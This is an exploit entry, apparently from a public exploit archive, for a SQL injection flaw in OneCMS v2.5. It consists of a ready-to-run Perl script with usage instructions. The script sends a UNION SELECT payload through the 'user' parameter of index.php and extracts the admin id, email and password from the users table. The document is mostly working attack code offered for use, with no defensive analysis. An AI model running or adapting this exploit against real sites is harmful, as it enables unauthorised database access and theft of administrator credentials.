# Exploit Title: ONECMS v2.5 SQL INJECTION 
# Date: 05.03.2010
# Author: Ctacok and .:[melkiy]:.
# Software Link: http://sourceforge.net/projects/onecms/
# Version: 2.5
# Tested on: Ubuntu 9.10 Apache2+PHP5

#!/usr/bin/perl 
use LWP::Simple;
print "\n";
print "##############################################################\n";
print "# ONECMS v2.5 SQL INJECTION                                  #\n";
print "# Bug founded by: .:[melkiy]:.                               #\n";
print "# Exploit coded by: Ctacok                                   #\n";
print "# Special for Antichat (forum.antichat.ru)                   #\n";
print "# Require : Magic_quotes = Off                               #\n";
print "##############################################################\n";
if (@ARGV < 2)
{
print "\n Usage: exploit.pl [host] [path] ";
print "\n EX : exploit.pl www.localhost.com /path/ prefix \n\n";
exit;
}
$host=$ARGV[0];
$path=$ARGV[1];
$prefix=$ARGV[2];   #  PREFIX TABLES, Default: onecms
$vuln = "-2'+union+select+1,2,3,4,5,6,7,8,concat(0x3a3a3a,id,0x3a,username,0x3a,password,0x3a3a3a),10,11+from+".$prefix."_users";
$doc = get($host.$path."index.php?load=elite&user=".$vuln."+--+");
if ($doc =~ /:::(.+):(.+):(.+):::/){
        	print "\n[+] Admin id: : $1";
		print "\n[+] Admin email: $2";
		print "\n[+] Admin password: $3";
}

